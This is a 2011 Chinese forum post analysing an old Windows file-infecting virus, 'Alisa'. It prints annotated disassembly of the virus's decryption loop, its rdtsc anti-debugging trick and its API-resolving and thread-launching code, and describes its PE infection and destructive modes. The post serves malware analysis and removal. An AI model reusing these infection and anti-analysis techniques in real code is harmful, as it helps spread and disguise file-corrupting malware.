
# [原创]感染型木马的分析与恢复 - “艾丽莎”

**标 题:** 【原创】【申精】感染型木马的分析与恢复 - “艾丽莎”

**作 者:** 雪之苏

**时 间:** 2011-04-20,18:27:09

**链 接:** http://bbs.pediy.com/newthread.php?do=newthread&f=4

## 写在前面的话

上次那个鬼影驱动，本来是准备分析的，可是不知道是我虚拟机环境有问题还是什么，死活感染不了MBR，过了几个反调后，就没继续分析，今天是写的一个东西，发上来

**病毒全名：** `Virus.Win32.Alisa.a`

**捕获时间：** 2007-9-27

算比较老的病毒了

## 病毒感染说明

病毒感染文件后，会修改入口前十个字节，修改成自己的代码，然后在最后一个节加上`0x1000`大小的代码段，将自身复制到里面，而且还会多重感染

### 1、病毒首先把自身代码解密出来

```
004049AE    0F31            rdtsc                                ; 取时间戳
004049B0    8985 9E000000   mov     dword ptr [ebp+9E], eax
004049B6    8995 A2000000   mov     dword ptr [ebp+A2], edx
004049BC    8B8D BB000000   mov     ecx, dword ptr [ebp+BB]      ; 原始的解密KEY
004049C2    8BC1            mov     eax, ecx
004049C4    F7E1            mul     ecx
004049C6    8BD0            mov     edx, eax
004049C8    F7D2            not     edx
004049CA    3195 BF000000   xor     dword ptr [ebp+BF], edx
004049D0    F7D2            not     edx
004049D2    8D9D C3000000   lea     ebx, dword ptr [ebp+C3]
004049D8    B9 70030000     mov     ecx, 370
004049DD    8DB5 92000000   lea     esi, dword ptr [ebp+92]
004049E3    8DBD 96000000   lea     edi, dword ptr [ebp+96]
004049E9    FF33            push    dword ptr [ebx]              ; 保存第二次解密的用的KEY
004049EB    52              push    edx
004049EC    0F31            rdtsc                                ; 想减得到运行时间，用来检测单步
004049EE    8985 A6000000   mov     dword ptr [ebp+A6], eax
004049F4    8995 AA000000   mov     dword ptr [ebp+AA], edx
004049FA    5A              pop     edx
004049FB    2B85 9E000000   sub     eax, dword ptr [ebp+9E]
00404A01    7D 02           jge     short 00404A05
00404A03    F7D8            neg     eax
00404A05    C1F8 19         sar     eax, 19
00404A08    F7D0            not     eax
00404A0A    33D0            xor     edx, eax
00404A0C    3113            xor     dword ptr [ebx], edx         ; 解密
00404A0E    5A              pop     edx                          ; 取出第二次解密用的KEY
00404A0F    60              pushad
00404A10    8DB5 A6000000   lea     esi, dword ptr [ebp+A6]
00404A16    8DBD 9E000000   lea     edi, dword ptr [ebp+9E]
00404A1C    6A 08           push    8
00404A1E    59              pop     ecx
00404A1F    FC              cld
00404A20    F3:A4           rep     movs byte ptr es:[edi], byte>
00404A22    61              popad
00404A23    8D85 9A000000   lea     eax, dword ptr [ebp+9A]
00404A29    DB06            fild    dword ptr [esi]
00404A2B    DB07            fild    dword ptr [edi]
00404A2D    DEC1            faddp   st(1), st
00404A2F    DB18            fistp   dword ptr [eax]
00404A31    0318            add     ebx, dword ptr [eax]
00404A33  ^ E2 B4           loopd   short 004049E9               ; 循环解密
```

这是一段病毒自解密过程，中间有利用`rdtsc`来反单步，如果是正常运行的话，两次运行时间相减，在`sar eax, 19`的话，`eax`值应该是0，`not`后应该是`0xffffffff`，也就是说正常的key应该 = `key xor 0xFFFFFFFF`，解密方法是

【内存1】【内存2】【内存3】【内存4】

这上面是比喻的加密部分，首先存在一个`key`，这个`key`就是上面的`dword ptr [ebp+BB]`

然后用这个原始`key` 转化后，`xor`【内存1】 得到【解密内存1】，而这个【内存1】作为【内存2】解密用的`key`，去`xor`【内存2】得到【解密内存2】，就这样循环下去，不知道这么说，大家清楚了没，如果不清楚，可以看附件里的清除代码

### 2.寻找kernel基址，通过输入表寻找需要用的函数地址，装载`MPR.DLL`，修复原文件的入口点前10个字节，启动感染线程，跳转回正常文件执行

```
00404A78    E8 7D090000     call    004053FA                                  ; 通过SEH链表找到KERNEL的基地址
00404A7D    6A 23           push    23
00404A7F    59              pop     ecx
00404A80    8DB5 C00B0000   lea     esi, dword ptr [ebp+BC0]
00404A86    E8 A1090000     call    0040542C                                  ; 通过搜索KERNEL输入表寻找必要的函数
00404A8B    EB 01           jmp     short 00404A8E
00404A8D    EB 74           jmp     short 00404B03
00404A8F    37              aaa
00404A90    EB 0C           jmp     short 00404A9E
00404A92    E8 A18BD581     call    8215D638
00404A97    C2 C300         retn    0C3
00404A9A    0000            add     byte ptr [eax], al
00404A9C    FFE2            jmp     edx
00404A9E    8D85 450E0000   lea     eax, dword ptr [ebp+E45]
00404AA4    50              push    eax
00404AA5    FF95 7D0C0000   call    dword ptr [ebp+C7D]                       ; 加载MPR.DLL
00404AAB    85C0            test    eax, eax
00404AAD    74 18           je      short 00404AC7
00404AAF    8985 BC0B0000   mov     dword ptr [ebp+BBC], eax
00404AB5    6A 03           push    3
00404AB7    59              pop     ecx
00404AB8    8DB5 490E0000   lea     esi, dword ptr [ebp+E49]
00404ABE    E8 69090000     call    0040542C                                  ; 搜索MPR输入表获得必要函数地址
00404AC3    33DB            xor     ebx, ebx
00404AC5    EB 03           jmp     short 00404ACA
00404AC7    83CB FF         or      ebx, FFFFFFFF
00404ACA    8BBD 350B0000   mov     edi, dword ptr [ebp+B35]
00404AD0    0BFF            or      edi, edi
00404AD2    74 10           je      short 00404AE4
00404AD4    8DB5 250B0000   lea     esi, dword ptr [ebp+B25]
00404ADA    6A 10           push    10
00404ADC    59              pop     ecx
00404ADD    FC              cld
00404ADE    F3:A4           rep     movs byte ptr es:[edi], byte ptr [esi]    ; 恢复原始入口点前10个字节
00404AE0    85DB            test    ebx, ebx
00404AE2    75 1F           jnz     short 00404B03
00404AE4    8D85 AC0B0000   lea     eax, dword ptr [ebp+BAC]
00404AEA    50              push    eax
00404AEB    6A 00           push    0
00404AED    6A 00           push    0
00404AEF    8D85 59010000   lea     eax, dword ptr [ebp+159]
00404AF5    50              push    eax
00404AF6    68 CC150000     push    15CC
00404AFB    6A 00           push    0
00404AFD    FF95 0E0D0000   call    dword ptr [ebp+D0E]                       ; 创建感染线程
00404B03    58              pop     eax
00404B04    FFE0            jmp     eax                                       ; 跳回正常文件执行
00404B06    E8 00000000     call    00404B0B                                  ; 感染线程 ↓
```

### 3.病毒感染

这部分没什么看头了，就是搜索一些文件夹，然后感染文件，不过它的感染分2种

条件: (年数 > 2003) and ( (月+ 日) = = 15) and ( `sdtsc`返回值的最低2位都是0)

这个感染标志将决定后面的感染方式。

**特殊感染标志为真时(极少数情况这个感染标志可能为真)：**

（1） 病毒将会通过`MoveFileExA`或写系统`ini`(`window ME/98/95`)的方式重启删除自己。

（2） 遍历文件时遍历所有文件进行感染。

（3） 感染文件时采用破坏的方式，对`PE`文件将破坏资源节，并将入口改为 "`JMP 自己`"的死循环，对非`PE`文件按`DWORD`重复异或`0x863DA60C`h。

**特殊感染标志为假时：**

（1） 遍历文件时只对后缀名是"`e?e`"(?可以是任何字符)的`PE`文件进行感染。

（2） 感染文件时将被感染文件最后一个节增加`0x1000`字节，将病毒体写入，并修改入口点的`0x10`个字节，使其指向病毒体。

（3） 病毒写入病毒体时，使用时间戳获得随机值作为`KEY`对病毒体主要代码进行加密。

以上就是对病毒的简单分析，代码见附录，由于文件的特殊性，就不提供`BIN`了，只提供专杀的源代码

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

**上传的附件：**

- `kill.zip`

  （1.08MB，185次下载）
